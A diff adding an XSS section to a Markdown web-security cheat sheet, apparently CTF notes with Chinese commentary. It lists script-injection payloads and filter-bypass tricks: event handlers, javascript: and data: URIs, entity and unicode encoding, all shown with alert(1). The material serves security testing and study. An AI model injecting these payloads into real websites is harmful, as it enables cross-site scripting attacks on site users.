@@ -41,6 +41,7 @@ Table of Contents
     * [Finger Print](#fingerprint)
 *  [XXE](#xxe)
     * [Out of Band XXE](#out-of-band-oob-xxe)
+*  [XSS](#xss)
 *  [Crypto](#密碼學)
     * [PRNG](#prng)
     * [ECB mode](#ecb-mode)
@@ -1773,6 +1774,77 @@ xxe.dtd:
 - PPTX
 - PDF
 - https://github.com/BuffaloWill/oxml_xxe
+
+# XSS
+
+## Basic Payload
+
+- `<script>alert(1)</script>`
+- `<svg/onload=alert(1)>`
+- `<img src=# onerror=alert(1)>`
+- `<a href="javascript:alert(1)">g</a>`
+- `<input type="text" value="g" onmouseover="alert(1)" />`
+- `<iframe src="javascript:alert(1)"></iframe>`
+- ...
+
+## Testing
+
+- `<script>alert(1)</script>`
+- `'"><script>alert(1)</script>`
+- `<img/src=@ onerror=alert(1)/>`
+- `'"><img/src=@ onerror=alert(1)/>`
+- `' onmouseover=alert(1) x='`
+- `" onmouseover=alert(1) x="`
+- ``` `onmouseover=alert(1) x=` ```
+- `javascript:alert(1)//`
+- ....
+
+## 繞過
+
+- `//`(javascript註解)被過濾時，可以利用算數運算符代替
+    - `<a href="javascript:alert(1)-abcde">xss</a>`
+- HTML特性
+    - 不分大小寫
+        - `<ScRipT>`
+        - `<img SrC=#>`
+    - 屬性值
+        - `src="#"`
+        - `src='#'`
+        - `src=#`
+        - ```src=`#` ``` (IE)
+- 編碼繞過
+    - `<svg/onload=alert(1)>`
+        - `<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>` (16進位) (分號可去掉)
+## 其他
+
+- 特殊標籤
+    - 以下標籤中的腳本無法執行
+    - `<title>`, `<textarea>`, `<iframe>`, `<plaintext>`, `<noscript>`...
+
+- 偽協議
+    - javascript:
+        - `<a href=javascript:alert(1) >xss</a>`
+    - data:
+        - `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>`
+- Javascript自解碼機制
+    - `<input type="button" onclick="document.write('&lt;img src=@ onerror=alert(1) /&gt;')" />`
+    - 會成功`alert(1)`，因為javascript位於HTML中，在執行javascript前會先解碼HTML編碼
+    - 但若是包在`<script>`中的javascript，不會解碼HTML編碼
+    - 此編碼為HTML entity和`&#xH;`(hex), `&#D;`(dec)形式
+
+- Javascript中有三套編碼/解碼函數
+    - escape/unescape
+    - encodeURI/decodeURI
+    - encodeURIComponent/decodeURICompinent
+
+- 一些alert(document.domain)的方法
+    - `(alert)(document.domain);`
+    - `al\u0065rt(document.domain);`
+    - `al\u{65}rt(document.domain);`
+    - `window['alert'](document.domain);`
+    - `alert.call(null,document.domain);`
+    - `alert.bind()(document.domain);`
+    - https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
 
 # 密碼學
 
